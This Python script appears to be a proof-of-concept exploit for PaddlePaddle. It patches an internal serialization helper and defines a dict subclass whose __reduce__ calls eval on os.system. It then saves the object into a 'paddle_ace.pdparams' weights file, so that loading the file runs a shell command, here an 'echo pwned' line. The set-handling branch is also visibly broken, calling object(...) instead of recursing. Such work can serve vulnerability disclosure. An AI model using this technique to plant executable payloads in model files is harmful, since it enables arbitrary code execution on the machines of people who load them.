import paddle
import numpy as np
from collections import Iterable, OrderedDict
    
def _parse_every_object(obj, condition_func, convert_func):
    if condition_func(obj):
        return convert_func(obj)
    elif isinstance(obj, (dict, OrderedDict, list)):
        if isinstance(obj, list):
            keys = range(len(obj))
        else:
            keys = list(obj.keys())
        for key in keys:
            if condition_func(obj[key]):
                obj[key] = convert_func(obj[key])
            else:
                obj[key] = _parse_every_object(
                    obj[key], condition_func, convert_func
                )
        return obj
    elif isinstance(obj, tuple):
        return tuple(
            _parse_every_object(list(obj), condition_func, convert_func)
        )
    elif isinstance(obj, set):
        object(list(obj), condition_func, convert_func)
    else:
        return obj
    
# hack _parse_every_object method
paddle.framework.io._parse_every_object = _parse_every_object

class BadDict(dict):
    def __init__(self, src: str, **kwargs):
        super().__init__(**kwargs)
        self.src = src

    def __reduce__(self):
        return (
            eval,
            (f"os.system('{self.src}') or dict()",),
            None,
            None,
            iter(self.items()),
        )

paddle.save(
    [BadDict(
        'echo "pwned your computer, I can do anything I want."',
        **{"weight": paddle.zeros((2, 2))},
    )],
    "paddle_ace.pdparams", 
)
